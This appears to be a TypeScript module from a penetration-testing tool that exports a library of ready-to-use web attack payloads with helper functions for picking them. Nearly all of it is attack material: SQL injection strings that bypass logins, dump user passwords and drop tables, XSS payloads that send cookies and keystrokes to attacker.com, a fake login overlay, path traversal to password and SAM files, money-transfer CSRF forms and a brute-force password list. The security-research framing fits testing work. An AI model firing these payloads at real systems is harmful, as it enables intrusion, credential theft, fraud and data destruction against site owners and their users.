// ðŸ”¥ ADVANCED EXPLOIT PAYLOADS LIBRARY
// Professional-grade attack patterns for penetration testing & security research

export const SQL_INJECTION_PAYLOADS = {
  // ===== AUTHENTICATION BYPASS =====
  authenticationBypass: [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "' OR 1=1--",
    "admin' --",
    "admin' #",
    "admin'/*",
    "' or 1=1--",
    "') or '1'='1--",
    "') or ('1'='1--",
    "' OR 'x'='x",
    "') OR ('a'='a",
    "' OR 'a'='a",
    "admin' OR '1'='1",
    "') OR '1'='1' /*",
    "' OR '1'='1' -- -",
    "1' OR '1' = '1",
    "1' OR '1' = '1' --",
    "1' OR '1' = '1' /*",
    "1' OR '1' = '1' #",
    "admin') OR ('1'='1--",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL, NULL--",
    "admin' AND 1=0 UNION ALL SELECT NULL, NULL, NULL--",
  ],

  // ===== UNION-BASED INJECTION =====
  unionBased: [
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL--",
    "' UNION SELECT username,password FROM users--",
    "' UNION SELECT table_name,NULL FROM information_schema.tables--",
    "' UNION SELECT column_name,NULL FROM information_schema.columns--",
    "' UNION ALL SELECT NULL,NULL,NULL--",
    "' UNION ALL SELECT username,password,email FROM users--",
    "' UNION SELECT 1,2,3,4,5--",
    "' UNION SELECT user(),database(),version()--",
    "' UNION SELECT load_file('/etc/passwd'),NULL--",
    "' UNION SELECT @@version,NULL,NULL--",
    "' UNION SELECT group_concat(username),group_concat(password) FROM users--",
  ],

  // ===== TIME-BASED BLIND =====
  timeBasedBlind: [
    "' AND SLEEP(5)--",
    "' OR SLEEP(5)--",
    "'; WAITFOR DELAY '00:00:05'--",
    "' AND IF(1=1, SLEEP(5), 0)--",
    "' AND IF(substring(user(),1,1)='a',SLEEP(5),0)--",
    "' WAITFOR DELAY '0:0:5'--",
    "'; SELECT pg_sleep(5)--",
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    "' AND 1=IF(1=1,BENCHMARK(5000000,MD5('test')),0)--",
    "' OR IF(1=1, SLEEP(5), 0)--",
  ],

  // ===== BOOLEAN-BASED BLIND =====
  booleanBasedBlind: [
    "' AND 1=1--",
    "' AND 1=2--",
    "' AND 'a'='a",
    "' AND 'a'='b",
    "' AND (SELECT COUNT(*) FROM users)>0--",
    "' AND substring(user(),1,1)='a'--",
    "' AND ascii(substring(user(),1,1))>97--",
    "' AND length(user())>5--",
    "' AND EXISTS(SELECT * FROM users WHERE username='admin')--",
  ],

  // ===== ERROR-BASED =====
  errorBased: [
    "' AND extractvalue(1,concat(0x7e,version()))--",
    "' AND updatexml(1,concat(0x7e,version()),1)--",
    "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),0x7e,FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)y)--",
    "' AND exp(~(SELECT * FROM (SELECT user())x))--",
    "' AND gtid_subset(user(),1)--",
  ],

  // ===== STACKED QUERIES =====
  stackedQueries: [
    "'; DROP TABLE users--",
    "'; DELETE FROM users WHERE 1=1--",
    "'; UPDATE users SET password='hacked'--",
    "'; INSERT INTO users VALUES('hacker','password')--",
    "'; EXEC xp_cmdshell('whoami')--",
    "'; CREATE TABLE pwned (data varchar(255))--",
  ],

  // ===== DATABASE ENUMERATION =====
  databaseEnum: [
    "' UNION SELECT schema_name FROM information_schema.schemata--",
    "' UNION SELECT table_name FROM information_schema.tables--",
    "' UNION SELECT column_name FROM information_schema.columns--",
    "' UNION SELECT user(),database(),version()--",
    "' UNION SELECT @@hostname,@@datadir,@@version--",
  ],

  // ===== ADVANCED TECHNIQUES =====
  advanced: [
    "admin' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>100--",
    "' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a'--",
    "' OR EXISTS(SELECT * FROM users WHERE username='admin' AND password LIKE 'a%')--",
    "' UNION SELECT NULL,NULL WHERE 1=2 UNION SELECT username,password FROM users--",
    "' AND 1=(SELECT COUNT(*) FROM tabname); DROP TABLE tabname; --",
  ]
}

export const XSS_PAYLOADS = {
  // ===== BASIC XSS =====
  basic: [
    "<script>alert('XSS')</script>",
    "<script>alert(1)</script>",
    "<script>alert(document.cookie)</script>",
    "<script>alert(document.domain)</script>",
    "<script>prompt('XSS')</script>",
    "<script>confirm('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<iframe src=\"javascript:alert('XSS')\">",
  ],

  // ===== EVENT HANDLER BASED =====
  eventHandlers: [
    "<img src=x onerror=alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "<select onfocus=alert(1) autofocus>",
    "<textarea onfocus=alert(1) autofocus>",
    "<body onload=alert(1)>",
    "<body onpageshow=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<marquee onstart=alert(1)>",
    "<div onmouseover=alert(1)>Hover me</div>",
    "<input onchange=alert(1)>",
  ],

  // ===== SVG BASED =====
  svgBased: [
    "<svg onload=alert(1)>",
    "<svg><script>alert(1)</script></svg>",
    "<svg><animate onbegin=alert(1)>",
    "<svg><set attributeName=onmouseover to=alert(1)>",
    "<svg><foreignObject><body onload=alert(1)></body></foreignObject></svg>",
    "<svg><a><animate attributeName=href values=javascript:alert(1)>",
    "<svg><animate attributeName=href to=javascript:alert(1)>",
  ],

  // ===== IFRAME BASED =====
  iframeBased: [
    "<iframe src=\"javascript:alert(1)\">",
    "<iframe src=\"data:text/html,<script>alert(1)</script>\">",
    "<iframe srcdoc=\"<script>alert(1)</script>\">",
    "<iframe src=x onload=alert(1)>",
    "<iframe src=\"//evil.com\">",
  ],

  // ===== JAVASCRIPT PROTOCOL =====
  javascriptProtocol: [
    "<a href=\"javascript:alert(1)\">Click</a>",
    "<form action=\"javascript:alert(1)\"><input type=submit>",
    "<button formaction=\"javascript:alert(1)\">Click</button>",
    "<input type=image formaction=\"javascript:alert(1)\">",
    "<isindex type=image action=\"javascript:alert(1)\">",
  ],

  // ===== COOKIE STEALING =====
  cookieStealing: [
    "<script>fetch('//attacker.com?c='+document.cookie)</script>",
    "<script>new Image().src='//attacker.com?c='+document.cookie</script>",
    "<img src=x onerror=\"fetch('//attacker.com?c='+document.cookie)\">",
    "<script>navigator.sendBeacon('//attacker.com',document.cookie)</script>",
    "<script>document.location='//attacker.com?c='+document.cookie</script>",
  ],

  // ===== KEYLOGGER =====
  keylogger: [
    "<script>document.onkeypress=function(e){fetch('//attacker.com?k='+e.key)}</script>",
    "<script>document.addEventListener('keypress',e=>fetch('//attacker.com?k='+e.key))</script>",
    "<body onkeydown=\"fetch('//attacker.com?k='+event.key)\">",
  ],

  // ===== PHISHING =====
  phishing: [
    "<div style=\"position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999\"><form action=\"//attacker.com\">Username:<input name=\"u\"><br>Password:<input type=\"password\" name=\"p\"><br><button>Login</button></form></div>",
    "<script>document.body.innerHTML='<h1>Session Expired</h1><form action=\"//attacker.com\">Username:<input name=\"u\"><br>Password:<input name=\"p\" type=\"password\"><br><button>Re-login</button></form>'</script>",
  ],

  // ===== BYPASS FILTERS =====
  filterBypass: [
    "<ScRiPt>alert(1)</sCrIpT>",
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
    "<svg><script>alert&#40;1&#41;</script></svg>",
    "<img src=x onerror=\"&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;\">",
    "<script>eval('\\x61\\x6c\\x65\\x72\\x74\\x28\\x31\\x29')</script>",
    "<img src=x onerror=\"window['ale'+'rt'](1)\">",
    "<script>window[\"\\x61\\x6c\\x65\\x72\\x74\"](1)</script>",
  ],

  // ===== DOM-BASED =====
  domBased: [
    "#<script>alert(1)</script>",
    "javascript:alert(1)//",
    "?search=<img src=x onerror=alert(1)>",
    "?name=<script>alert(1)</script>",
  ],

  // ===== POLYGLOT =====
  polyglot: [
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//\\x3e",
    "'\"><img src=x onerror=alert(1)>",
    "\"><script>alert(1)</script>",
    "'><script>alert(1)</script>",
  ]
}

export const ACCESS_CONTROL_PAYLOADS = {
  // ===== IDOR (Insecure Direct Object Reference) =====
  idor: [
    "/api/users/1",
    "/api/users/2",
    "/api/users/admin",
    "/profile?id=1",
    "/profile?id=2",
    "/document?id=1",
    "/document?id=../../../etc/passwd",
    "/api/admin/users/delete?id=1",
  ],

  // ===== PATH TRAVERSAL =====
  pathTraversal: [
    "/admin/../admin",
    "/user/../../admin",
    "/api/files?path=../../../etc/passwd",
    "/api/files?path=....//....//....//etc/passwd",
    "/download?file=../../config.json",
    "/api/read?file=..\\..\\..\\windows\\system32\\config\\sam",
  ],

  // ===== PARAMETER MANIPULATION =====
  parameterManipulation: [
    "?admin=true",
    "?isAdmin=1",
    "?role=admin",
    "?privilege=high",
    "?access=full",
    "?user=admin",
    "?id=1&admin=true",
    "?userId=1&isAdmin=true",
  ],

  // ===== HTTP METHOD OVERRIDE =====
  methodOverride: [
    "?_method=PUT",
    "?_method=DELETE",
    "?_method=PATCH",
    "X-HTTP-Method-Override: PUT",
    "X-HTTP-Method: DELETE",
  ],

  // ===== CASE MANIPULATION =====
  caseManipulation: [
    "/Admin",
    "/ADMIN",
    "/AdMiN",
    "/aDmIn",
  ],

  // ===== HEADER MANIPULATION =====
  headerManipulation: [
    "X-Original-URL: /admin",
    "X-Rewrite-URL: /admin",
    "X-Forwarded-For: 127.0.0.1",
    "X-Remote-Addr: 127.0.0.1",
    "X-Client-IP: 127.0.0.1",
    "X-Custom-IP-Authorization: 127.0.0.1",
  ]
}

export const CSRF_PAYLOADS = {
  // ===== AUTO-SUBMIT FORMS =====
  autoSubmitForms: [
    `<html><body onload="document.forms[0].submit()"><form action="https://target.com/api/transfer" method="POST"><input type="hidden" name="amount" value="10000"><input type="hidden" name="recipient" value="attacker@evil.com"></form></body></html>`,
    `<form id="csrf" action="https://target.com/api/delete" method="POST"><input type="hidden" name="id" value="1"></form><script>document.getElementById('csrf').submit()</script>`,
  ],

  // ===== IMAGE-BASED =====
  imageBased: [
    `<img src="https://target.com/api/delete?id=1">`,
    `<img src="https://target.com/logout">`,
  ],

  // ===== FETCH-BASED =====
  fetchBased: [
    `<script>fetch('https://target.com/api/transfer', {method:'POST', body:'amount=10000&recipient=attacker', credentials:'include'})</script>`,
    `<script>fetch('https://target.com/api/delete?id=1', {credentials:'include'})</script>`,
  ],

  // ===== XMLHTTPREQUEST =====
  xhr: [
    `<script>var xhr = new XMLHttpRequest(); xhr.open('POST', 'https://target.com/api/transfer', true); xhr.withCredentials = true; xhr.send('amount=10000&recipient=attacker');</script>`,
  ]
}

export const BRUTE_FORCE_PAYLOADS = {
  // ===== COMMON PASSWORDS =====
  commonPasswords: [
    "123456",
    "password",
    "123456789",
    "12345678",
    "12345",
    "1234567",
    "password1",
    "123123",
    "1234567890",
    "000000",
    "admin",
    "admin123",
    "root",
    "toor",
    "pass",
    "test",
    "guest",
    "qwerty",
    "abc123",
    "welcome",
    "monkey",
    "letmein",
    "dragon",
    "master",
    "sunshine",
    "princess",
    "football",
    "iloveyou",
    "admin@123",
    "Pass@123",
  ],

  // ===== USERNAME LIST =====
  commonUsernames: [
    "admin",
    "administrator",
    "root",
    "user",
    "test",
    "guest",
    "info",
    "adm",
    "mysql",
    "postgres",
    "oracle",
    "ftp",
    "support",
    "webmaster",
    "backup",
  ]
}

export const SECURITY_HEADERS_TESTS = {
  // ===== MISSING HEADERS =====
  criticalHeaders: [
    "Content-Security-Policy",
    "X-Frame-Options",
    "X-Content-Type-Options",
    "Strict-Transport-Security",
    "X-XSS-Protection",
    "Referrer-Policy",
    "Permissions-Policy",
  ],

  // ===== CLICKJACKING TESTS =====
  clickjackingPayloads: [
    `<iframe src="https://target.com"></iframe>`,
    `<iframe src="https://target.com/admin"></iframe>`,
  ]
}

// ===== PAYLOAD STATISTICS =====
export const PAYLOAD_STATS = {
  sqlInjection: {
    total: Object.values(SQL_INJECTION_PAYLOADS).reduce((acc, arr) => acc + arr.length, 0),
    categories: Object.keys(SQL_INJECTION_PAYLOADS).length
  },
  xss: {
    total: Object.values(XSS_PAYLOADS).reduce((acc, arr) => acc + arr.length, 0),
    categories: Object.keys(XSS_PAYLOADS).length
  },
  accessControl: {
    total: Object.values(ACCESS_CONTROL_PAYLOADS).reduce((acc, arr) => acc + arr.length, 0),
    categories: Object.keys(ACCESS_CONTROL_PAYLOADS).length
  },
  csrf: {
    total: Object.values(CSRF_PAYLOADS).reduce((acc, arr) => acc + arr.length, 0),
    categories: Object.keys(CSRF_PAYLOADS).length
  },
  bruteForce: {
    total: Object.values(BRUTE_FORCE_PAYLOADS).reduce((acc, arr) => acc + arr.length, 0),
    categories: Object.keys(BRUTE_FORCE_PAYLOADS).length
  }
}

// Helper function to get random payload
export function getRandomPayload(type: keyof typeof SQL_INJECTION_PAYLOADS | keyof typeof XSS_PAYLOADS, category?: string) {
  const payloads = type.startsWith('sql') ? SQL_INJECTION_PAYLOADS : XSS_PAYLOADS
  
  if (category && payloads[category]) {
    const arr = payloads[category]
    return arr[Math.floor(Math.random() * arr.length)]
  }
  
  // Get random from all categories
  const allCategories = Object.values(payloads).flat()
  return allCategories[Math.floor(Math.random() * allCategories.length)]
}

// Helper function to get all payloads of a type
export function getAllPayloads(type: 'sql' | 'xss' | 'access' | 'csrf' | 'brute') {
  switch (type) {
    case 'sql':
      return SQL_INJECTION_PAYLOADS
    case 'xss':
      return XSS_PAYLOADS
    case 'access':
      return ACCESS_CONTROL_PAYLOADS
    case 'csrf':
      return CSRF_PAYLOADS
    case 'brute':
      return BRUTE_FORCE_PAYLOADS
    default:
      return {}
  }
}
